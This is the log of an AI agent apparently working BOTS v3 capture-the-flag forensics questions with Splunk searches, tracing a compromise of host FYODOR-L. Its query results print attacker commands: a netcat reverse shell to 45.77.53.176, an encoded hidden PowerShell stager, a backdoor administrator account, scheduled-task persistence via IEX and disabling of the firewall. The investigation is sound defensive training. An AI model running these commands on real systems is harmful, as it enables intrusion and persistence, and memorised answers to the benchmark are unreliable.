{"_time": "2018-08-20T18:47:41.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-00109914D901}", "TargetFilename": "C:\\Windows\\Temp\\unziped\\lsof-master\\powershell.exe", "count": "1"}], "meta": {"total_event_count": 2, "returned": 2, "sid": "1790258846.1430"}}


[STATE:agent_in]  step=4  msgs=66  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"_time": "2018-08-20T18:47:41.000+08:00", "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powers'

[Agent thinking]
Intention: Re-run the logos.png retrieval row with its full transfer fields (site, user agent, bytes) to quote it literally for p2.



[STATE:verify_in]  step=5  msgs=67  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" \"logos.png\" | stats count by src_ip, dest_ip, site, uri_path, http_method, status, http_user_agent"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=5  msgs=67  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" \"logos.png\" | stats count by src_ip, dest_ip, site, uri_path, http_method, status, http_user_agent"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" \"logos.png\" | stats count by src_ip, dest_ip, site, uri_path, http_method, status, http_user_agent"})
          -> {"results": [{"src_ip": "192.168.70.186", "dest_ip": "45.77.53.176", "site": "45.77.53.176:3333", "uri_path": "/images/logos.png", "http_method": "GET", "status": "200", "http_user_agent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.112", "count": "1"}], "meta": {"total_event_count": 1, "returned": 1, "sid": "1790258853.1431"}}


[STATE:agent_in]  step=5  msgs=68  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"src_ip": "192.168.70.186", "dest_ip": "45.77.53.176", "site": "45.77.53.176:3333", "uri_path": "/images/l'

[Agent thinking]
All five decisive queries re-run this round, each returning its complete population. One correction surfaced: the tool file is literally spelled `iexeplorer.exe` (my earlier rounds wrote "iexepler.exe" — a transcription slip; the container answer is unaffected). Filing the premise verdicts with this round's literal rows.


[WORKER RESULT] Senior-1-Q316: All five decisive queries re-run this round, each returning its complete population. One correction surfaced: the tool file is literally spelled `iexeplorer.exe` (my earlier rounds wrote "iexepler.exe

[STATE:agent_in]  step=0  msgs=1  errors=0  empty=0  verified=False
  last_msg: HumanMessage -> 'SITUATION. Frothly Corporation is a high-growth craft brewery. Its IT environment consists of corporate Windows and Linu'

[Agent thinking]
I'll start by confirming the feeds I need (stream:http for the retrieval, Sysmon for file creations) and sampling the raw retrieval event to learn its field structure.


[STATE:verify_in]  step=1  msgs=2  errors=0  empty=0  verified=False
  last_msg: AIMessage -> tool_call: get_source_types({})
[Verify REJECT] No Intention stated (retry 1/2)

[STATE:agent_in]  step=1  msgs=3  errors=0  empty=0  verified=False
  last_msg: ToolMessage -> '{"error": "Rejected: You must state your reasoning before calling any tool. Write an \'Intention: <why you are making thi'

[Agent thinking]
Intention: Confirm the available sourcetypes so I can scope the stream:http retrieval and Sysmon file-creation feeds before querying them.


[STATE:verify_in]  step=2  msgs=4  errors=0  empty=0  verified=False
  last_msg: AIMessage -> tool_call: get_source_types({})
[Verify OK]     get_source_types

[STATE:execute_in]  step=2  msgs=4  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: get_source_types({})
[Execute] get_source_types({})
          -> {"source_types": ["access_combined", "alternatives", "amazon-ssm-agent", "amazon-ssm-agent-too_small", "apache_error", "aws:cloudtrail", "aws:cloudwatch", "aws:cloudwatch:guardduty", "aws:cloudwatchlogs", "aws:cloudwatchlogs:vpcflow", "aws:config:rule", "aws:description", "aws:elb:accesslogs", "aws:rds:audit", "aws:rds:error", "aws:s3:accesslogs", "bandwidth", "bash_history", "bootstrap", "cisco:asa", "cloud-init", "cloud-init-output", "code42:api", "code42:computer", "code42:org", "code42:security", "code42:user", "config_file", "cpu", "cron-too_small", "df", "dmesg", "dpkg", "error-too_small", "errors", "errors-too_small", "ess_content_importer", "hardware", "history-2", "interfaces", "iostat", "lastlog", "linux_audit", "linux_secure", "localhost-5", "lsof", "maillog-too_small", "ms:aad:audit", "ms:aad:signin", "ms:o365:management", "ms:o365:reporting:messagetrace", "netstat", "o365:management:activity", "osquery:info", "osquery:results", "osquery:warning", "out-3", "package", "protocol", "ps", "stream:arp", "stream:dhcp", "stream:dns", "stream:http", "stream:icmp", "stream:igmp", "stream:ip", "stream:mysql", "stream:smb", "stream:smtp", "stream:tcp", "stream:udp", "symantec:ep:agent:file", "symantec:ep:agt_system:file", "symantec:ep:behavior:file", "symantec:ep:packet:file", "symantec:ep:risk:file", "symantec:ep:scm_system:file", "symantec:ep:security:file", "symantec:ep:traffic:file", "syslog", "time", "top", "vmstat", "who", "yum-too_small", "WinEventLog", "WinHostMon", "PerfmonMk:Process", "Script:GetEndpointInfo", "Script:InstalledApps", "Script:ListeningPorts", "Unix:ListeningPorts", "Unix:SSHDConfig", "Unix:Service", "Unix:Update", "Unix:Uptime", "Unix:UserAccounts", "Unix:Version", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "openPorts", "usersWithLoginPrivs"], "count": 102}


[STATE:agent_in]  step=2  msgs=5  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"source_types": ["access_combined", "alternatives", "amazon-ssm-agent", "amazon-ssm-agent-too_small", "apache_error", "'

[Agent thinking]
Intention: Find the raw stream:http retrieval from 45.77.53.176:3333 on FYODOR-L — the Q314 anchor — to see exactly what file was retrieved and by which process.


[STATE:verify_in]  step=3  msgs=6  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=stream:http dest_ip=45.77.53.176 OR src_ip=45.77.53.176 | stats count by src_ip, dest_ip, dest_port, http_method, url, status_code, site, user_agent, _time | sort - _time"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=3  msgs=6  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=stream:http dest_ip=45.77.53.176 OR src_ip=45.77.53.176 | stats count by src_ip, dest_ip, dest_port, http_method, url, status_code, site, user_agent, _time | sort - _time"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=stream:http dest_ip=45.77.53.176 OR src_ip=45.77.53.176 | stats count by src_ip, dest_ip, dest_port, http_method, url, status_code, site, user_agent, _time | sort - _time"})
          -> {"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790259102.1435"}}


[STATE:agent_in]  step=3  msgs=7  errors=0  empty=1  verified=True
  last_msg: ToolMessage -> '{"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790259102.1435"}}'

[Agent thinking]
Intention: The field names may differ; learn stream:http's field structure before re-querying.



[STATE:verify_in]  step=4  msgs=8  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: get_sourcetype_fields({"sourcetype":"stream:http"})
[Verify OK]     get_sourcetype_fields

[STATE:execute_in]  step=4  msgs=8  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: get_sourcetype_fields({"sourcetype":"stream:http"})
[Execute] get_sourcetype_fields({"sourcetype":"stream:http"})
          -> {"results": [{"field": "app", "count": "24191", "distinct_count": "1", "values": "[{\"value\":\"http\",\"count\":24191}]"}, {"field": "endtime", "count": "24191", "distinct_count": "15", "values": "[{\"value\":\"2018-08-20T10:34:46.115345Z\",\"count\":280},{\"value\":\"2018-08-20T10:31:44.183614Z\",\"count\":187},{\"value\":\"2018-08-20T10:33:45.815958Z\",\"count\":186}]"}, {"field": "eventtype", "count": "24191", "distinct_count": "3", "values": "[{\"value\":\"stream_network_traffic\",\"count\":24191},{\"value\":\"stream_web\",\"count\":19000},{\"value\":\"err0r\",\"count\":19}]"}, {"field": "host", "count": "24191", "distinct_count": "15", "values": "[{\"value\":\"gacrux.i-0920036c8ca91e501\",\"count\":5353},{\"value\":\"BTUN-L\",\"count\":4700},{\"value\":\"gacrux.i-06fea586f3d3c8ce8\",\"count\":1789}]"}, {"field": "index", "count": "24191", "distinct_count": "1", "values": "[{\"value\":\"botsv3\",\"count\":24191}]"}, {"field": "linecount", "count": "24191", "distinct_count": "1", "values": "[{\"value\":\"1\",\"count\":24191}]"}, {"field": "protocol", "count": "24191", "distinct_count": "1", "values": "[{\"value\":\"http\",\"count\":24191}]"}, {"field": "punct", "count": "24191", "distinct_count": "15", "values": "[{\"value\":\"{\\\"\\\":\\\"--::.\\\",\\\"\\\":\\\"--::.\\\",\\\"\\\":,\\\"\\\":\\\":::::\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":\\\"\",\"count\":10398},{\"value\":\"{\\\"\\\":\\\"--::.\\\",\\\"\\\":\\\"--::.\\\",\\\"\\\":,\\\"\\\":\\\"...\\\",\\\"\\\":\\\"..\\\",\\\"\\\":,\\\"\\\"\",\"count\":3300},{\"value\":\"{\\\"\\\":\\\"--::.\\\",\\\"\\\":\\\"--::.\\\",\\\"\\\":,\\\"\\\":\\\"...\\\",\\\"\\\":}\",\"count\":2729}]"}, {"field": "source", "count": "24191", "distinct_count": "5", "values": "[{\"value\":\"stream:http\",\"count\":10398},{\"value\":\"stream:Splunk_HTTPURI\",\"count\":6029},{\"value\":\"stream:Splunk_HTTPStatus\",\"count\":2729}]"}, {"field": "sourcetype", "count": "24191", "distinct_count": "1", "values": "[{\"value\":\"stream:http\",\"count\":24191}]"}, {"field": "splunk_server", "count": "24191", "distinct_count": "1", "values": "[{\"value\":\"DESKTOP-Q4TP1FN\",\"count\":24191}]"}, {"field": "tag", "count": "24191", "distinct_count": "4", "values": "[{\"value\":\"communicate\",\"count\":24191},{\"value\":\"network\",\"count\":24191},{\"value\":\"web\",\"count\":19000}]"}, {"field": "tag::eventtype", "count": "24191", "distinct_count": "4", "values": "[{\"value\":\"communicate\",\"count\":24191},{\"value\":\"network\",\"count\":24191},{\"value\":\"web\",\"count\":19000}]"}, {"field": "timestamp", "count": "24191", "distinct_count": "15", "values": "[{\"value\":\"2018-08-20T10:34:46.115345Z\",\"count\":280},{\"value\":\"2018-08-20T10:31:44.183614Z\",\"count\":187},{\"value\":\"2018-08-20T10:33:45.815958Z\",\"count\":186}]"}, {"field": "dest", "count": "21717", "distinct_count": "15", "values": "[{\"value\":\"172.16.0.178\",\"count\":4314},{\"value\":\"169.254.169.254\",\"count\":1949},{\"value\":\"54.67.127.227\",\"count\":1809}]"}, {"field": "dest_ip", "count": "21717", "distinct_count": "15", "values": "[{\"value\":\"172.16.0.178\",\"count\":4314},{\"value\":\"169.254.169.254\",\"count\":1949},{\"value\":\"54.67.127.227\",\"count\":1809}]"}, {"field": "status", "count": "19000", "distinct_count": "14", "values": "[{\"value\":\"200\",\"count\":16269},{\"value\":\"302\",\"count\":563},{\"value\":\"304\",\"count\":497}]"}, {"field": "action", "count": "17485", "distinct_count": "2", "values": "[{\"value\":\"allowed\",\"count\":16890},{\"value\":\"blocked\",\"count\":595}]"}, {"field": "uri_path", "count": "16427", "distinct_count": "15", "values": "[{\"value\":\"/\",\"count\":3506},{\"value\":\"/suitecrm/index.php\",\"count\":645},{\"value\":\"/latest/meta-data/instance-id\",\"count\":584}]"}, {"field": "site", "count": "16232", "distinct_count": "15", "values": "[{\"value\":\"www.brewertalk.com\",\"count\":4751},{\"value\":\"172.16.0.178\",\"count\":1204},{\"value\":\"169.254.169.254\",\"count\":1115}]"}, {"field": "count", "count": "13793", "distinct_count": "15", "values": "[{\"value\":\"1\",\"count\":8197},{\"value\":\"2\",\"count\":2167},{\"value\":\"4\",\"count\":1759}]"}, {"field": "sum(time_taken)", "count": "11064", "distinct_count": "15", "values": "[{\"value\":\"363\",\"count\":19},{\"value\":\"347\",\"count\":14},{\"value\":\"350\",\"count\":12}]"}, {"field": "bytes", "count": "10398", "distinct_count": "15", "values": "[{\"value\":\"20247\",\"count\":1441},{\"value\":\"20246\",\"count\":612},{\"value\":\"826\",\"count\":337}]"}, {"field": "bytes_in", "count": "10398", "distinct_count": "15", "values": "[{\"value\":\"127\",\"count\":1770},{\"value\":\"126\",\"count\":619},{\"value\":\"500\",\"count\":351}]"}, {"field": "bytes_out", "count": "10398", "distinct_count": "15", "values": "[{\"value\":\"20120\",\"count\":2096},{\"value\":\"326\",\"count\":298},{\"value\":\"19992\",\"count\":191}]"}, {"field": "dest_mac", "count": "10398", "distinct_count": "15", "values": "[{\"value\":\"02:A0:38:1B:B3:70\",\"count\":2758},{\"value\":\"00:50:56:E3:15:68\",\"count\":2208},{\"value\":\"00:50:56:FF:7D:5C\",\"count\":752}]"}, {"field": "dest_port", "count": "10398", "distinct_count": "15", "values": "[{\"value\":\"80\",\"count\":10271},{\"value\":\"8080\",\"count\":34},{\"value\":\"8000\",\"count\":3}]"}, {"field": "duration", "count": "10398", "distinct_count": "15", "values": "[{\"value\":\"0\",\"count\":88},{\"value\":\"418\",\"count\":13},{\"value\":\"553\",\"count\":11}]"}], "meta": {"total_event_count": 57, "returned": 57, "sid": "1790259111.1436", "clipped": "values longer than 1500 chars are cut; extract what you need with rex/eval to read the rest", "truncated": "showing 28 of 57 rows \u2014 the rest were not returned (too large); narrow the query to get a shorter answer"}}


[STATE:agent_in]  step=4  msgs=9  errors=0  empty=1  verified=True
  last_msg: ToolMessage -> '{"results": [{"field": "app", "count": "24191", "distinct_count": "1", "values": "[{\\"value\\":\\"http\\",\\"count\\":24191}]'

[Agent thinking]
Intention: dest_port 3333 wasn't in the top values but may exist among the rarer ones; search stream:http for the IP as a raw token to find the retrieval row.



[STATE:verify_in]  step=5  msgs=10  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=stream:http \"45.77.53.176\" | stats count by src_ip, dest_ip, src_port, dest_port, http_method, uri_path, bytes, bytes_in, bytes_out, status, site, user_agent, _time"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=5  msgs=10  errors=0  empty=1  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=stream:http \"45.77.53.176\" | stats count by src_ip, dest_ip, src_port, dest_port, http_method, uri_path, bytes, bytes_in, bytes_out, status, site, user_agent, _time"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=stream:http \"45.77.53.176\" | stats count by src_ip, dest_ip, src_port, dest_port, http_method, uri_path, bytes, bytes_in, bytes_out, status, site, user_agent, _time"})
          -> {"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790259122.1437"}}


[STATE:agent_in]  step=5  msgs=11  errors=0  empty=2  verified=True
  last_msg: ToolMessage -> '{"results": [], "meta": {"total_event_count": 0, "returned": 0, "sid": "1790259122.1437"}}'

[Agent thinking]
Intention: The IP may appear in other feeds (stream:tcp, Sysmon, etc.); search the whole index for 45.77.53.176 to find which feeds carry the retrieval.



[STATE:verify_in]  step=6  msgs=12  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 \"45.77.53.176\" | stats count by sourcetype, source"})
[Verify REJECT] run_splunk_search — Rejected: every run_splunk_search query must include a sourcetype filter. Call get_source_types to find the right sourcetype, then add sourcetype=<value> to the query.

[STATE:agent_in]  step=6  msgs=13  errors=0  empty=2  verified=False
  last_msg: ToolMessage -> '{"error": "Rejected: every run_splunk_search query must include a sourcetype filter. Call get_source_types to find the r'

[Agent thinking]
Intention: Find which feeds carry 45.77.53.176 by searching the Sysmon feed (the likely carrier of the FYODOR-L retrieval) for the IP.



[STATE:verify_in]  step=7  msgs=14  errors=0  empty=2  verified=False
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" \"45.77.53.176\" | stats count by EventCode, Computer, source"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=7  msgs=14  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" \"45.77.53.176\" | stats count by EventCode, Computer, source"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" \"45.77.53.176\" | stats count by EventCode, Computer, source"})
          -> {"results": [{"EventCode": "1", "Computer": "FYODOR-L.froth.ly", "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational", "count": "4"}, {"EventCode": "3", "Computer": "ABUNGST-L.froth.ly", "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational", "count": "1070"}, {"EventCode": "3", "Computer": "FYODOR-L.froth.ly", "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational", "count": "3850"}], "meta": {"total_event_count": 3, "returned": 3, "sid": "1790259132.1438"}}


[STATE:agent_in]  step=7  msgs=15  errors=0  empty=2  verified=True
  last_msg: ToolMessage -> '{"results": [{"EventCode": "1", "Computer": "FYODOR-L.froth.ly", "source": "WinEventLog:Microsoft-Windows-Sysmon/Operati'

[Agent thinking]
Intention: Read the 4 FYODOR-L EventCode 1 (process creation) events mentioning 45.77.53.176 — these should show the download command line naming the retrieved file.



[STATE:verify_in]  step=8  msgs=16  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 \"45.77.53.176\" | stats count by _time, host, Image, CommandLine, ParentImage, ProcessGuid, ProcessId"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=8  msgs=16  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 \"45.77.53.176\" | stats count by _time, host, Image, CommandLine, ParentImage, ProcessGuid, ProcessId"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 \"45.77.53.176\" | stats count by _time, host, Image, CommandLine, ParentImage, ProcessGuid, ProcessId"})
          -> {"results": [{"_time": "2018-08-20T19:13:56.000+08:00", "host": "FYODOR-L", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe\"", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-D465-5B58-0000-0010132A2A02}", "ProcessId": "3884", "count": "1"}, {"_time": "2018-08-20T19:13:57.000+08:00", "host": "FYODOR-L", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe\"", "ParentImage": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "ProcessGuid": "{EBF7A186-D466-5B58-0000-0010D12E2A02}", "ProcessId": "5976", "count": "1"}, {"_time": "2018-08-20T19:34:00.000+08:00", "host": "FYODOR-L", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe\"", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-D919-5B58-0000-0010119F3F02}", "ProcessId": "3804", "count": "1"}, {"_time": "2018-08-20T19:34:01.000+08:00", "host": "FYODOR-L", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe\"", "ParentImage": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "ProcessGuid": "{EBF7A186-D91A-5B58-0000-0010BCA23F02}", "ProcessId": "3388", "count": "1"}], "meta": {"total_event_count": 4, "returned": 4, "sid": "1790259141.1439"}}


[STATE:agent_in]  step=8  msgs=17  errors=0  empty=2  verified=True
  last_msg: ToolMessage -> '{"results": [{"_time": "2018-08-20T19:13:56.000+08:00", "host": "FYODOR-L", "Image": "C:\\\\Windows\\\\Temp\\\\unziped\\\\lsof-m'

[Agent thinking]
Intention: These are the iexeplorer.exe exploit executions, not the download. Now pivot on the established download ProcessGuid {EBF7A186-C442-5B58-0000-00109914D901} to see its process creation, network connection, and file creations in one view.



[STATE:verify_in]  step=9  msgs=18  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" \"{EBF7A186-C442-5B58-0000-00109914D901}\" | stats count by EventCode, _time, Image, CommandLine, ParentImage, ProcessId"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=9  msgs=18  errors=0  empty=2  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" \"{EBF7A186-C442-5B58-0000-00109914D901}\" | stats count by EventCode, _time, Image, CommandLine, ParentImage, ProcessId"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" \"{EBF7A186-C442-5B58-0000-00109914D901}\" | stats count by EventCode, _time, Image, CommandLine, ParentImage, ProcessId"})
          -> {"results": [{"EventCode": "1", "_time": "2018-08-20T18:07:06.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAG8AbgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AQQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAGUAbQBCAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AEUAKAAkAG4AdQBsAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAG8AbABsAGUAYwB0AGkAbwBOAHMALgBHAGUATgBlAFIASQBDAC4ARABpAEMAdABJAG8AbgBhAFIAeQBbAFMAVAByAGkAbgBnACwAUwB5AFMAdABFAE0ALgBPAEIAagBlAGMAdABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApAD\u2026[3898 more chars cut]", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "6360", "count": "1"}, {"EventCode": "1", "_time": "2018-08-20T18:08:17.000+08:00", "Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "\"C:\\Windows\\system32\\net.exe\" user /add svcvnc Password123!", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "9800", "count": "1"}, {"EventCode": "1", "_time": "2018-08-20T18:08:35.000+08:00", "Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "\"C:\\Windows\\system32\\net.exe\" localgroup administrators svcvnc /add", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "7532", "count": "1"}, {"EventCode": "1", "_time": "2018-08-20T18:09:44.000+08:00", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "\"C:\\Windows\\system32\\schtasks.exe\" /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\\Software\\Microsoft\\Network debug).debug)))\\\"\"", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "8408", "count": "1"}, {"EventCode": "1", "_time": "2018-08-20T18:16:39.000+08:00", "Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "\"C:\\Windows\\system32\\whoami.exe\"", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "7676", "count": "1"}, {"EventCode": "1", "_time": "2018-08-20T18:16:54.000+08:00", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "\"C:\\Windows\\system32\\schtasks.exe\" /Delete /TN Updater /F", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "6924", "count": "1"}, {"EventCode": "1", "_time": "2018-08-20T18:40:57.000+08:00", "Image": "C:\\Windows\\System32\\NETSTAT.EXE", "CommandLine": "\"C:\\Windows\\system32\\NETSTAT.EXE\" -an", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "9712", "count": "1"}, {"EventCode": "1", "_time": "2018-08-20T18:41:46.000+08:00", "Image": "C:\\Windows\\System32\\NETSTAT.EXE", "CommandLine": "\"C:\\Windows\\system32\\NETSTAT.EXE\" -an", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "10772", "count": "1"}, {"EventCode": "1", "_time": "2018-08-20T18:43:10.000+08:00", "Image": "C:\\Windows\\Temp\\hdoor.exe", "CommandLine": "\"C:\\windows\\temp\\hdoor.exe\" -hbs 192.168.9.1-192.168.9.50 /b /m /n", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "10260", "count": "1"}, {"EventCode": "1", "_time": "2018-08-20T18:46:29.000+08:00", "Image": "C:\\Windows\\System32\\netsh.exe", "CommandLine": "\"C:\\Windows\\system32\\netsh.exe\" advfirewall set allprofiles state off", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "9352", "count": "1"}, {"EventCode": "1", "_time": "2018-08-20T19:05:40.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action whoami", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessId": "2668", "count": "1"}, 